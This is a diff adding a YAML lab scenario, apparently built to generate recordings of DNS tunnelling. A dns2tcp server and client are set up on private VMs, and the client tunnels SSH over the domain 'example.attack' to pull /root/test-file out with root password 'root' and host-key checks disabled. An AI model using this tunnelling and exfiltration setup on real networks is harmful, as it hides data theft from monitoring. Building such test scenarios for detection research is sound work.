@@ -1,0 +1,43 @@
+dns_attack_server:
+    name: dns2tcp_server
+    image: ubuntu/focal64
+    ipv4_address: 192.168.0.20
+    description: |
+      This sets up the DNS2TCP server.
+    setup:
+        type: ansible
+        val: dns2tcp_server_setup
+    run:
+        type: shell
+        val: |-
+          sudo apt install -y socat;
+          nohup asciinema rec /tmp/dns2tcp_server_{{ variables.record_type }}.cast -c \'set -x; dns2tcpd -d 1 -f /opt/dns2tcpdrc & sleep 1\'
+    artifacts_to_collect:
+      - type: files
+        val: ["/tmp/*.cast"]
+
+dns_attack_client:
+    name: dns2tcp_client
+    image: ubuntu/focal64
+    ipv4_address: 192.168.0.30
+    description: |
+      This sets up the DNS2TCP client.
+    setup:
+      type: script
+      val: dns2tcp_client_setup.bash
+    run:
+        type: shell
+        val: >-
+          set -x;
+          dns2tcpc -z example.attack -k {{ variables.passphrase }} 127.0.0.1 -r ssh -l 12345 {{ variables.compression }} -T {{ variables.record_type }} & sleep 1;
+          rsync -P --rsh="sshpass -p root ssh -l root -oStrictHostKeyChecking=no -p 12345" 127.0.0.1:/root/test-file /tmp/
+    artifacts_to_collect:
+      - type: files
+        val: ["/tmp/*.cast"]
+      - type: cli_recording
+        val: ["/tmp/dns2tcp_client_{{ variables.record_type }}_{{ 'compressed' if variables.compression=='-c' else 'noncompressed' }}_{{ variables.passphrase }}.cast"]
+
+    variables:
+        - record_type: ["TXT", "KEY"]
+        - compression: ["-c", ""]
+        - passphrase: ["0xDEADBEEF"]
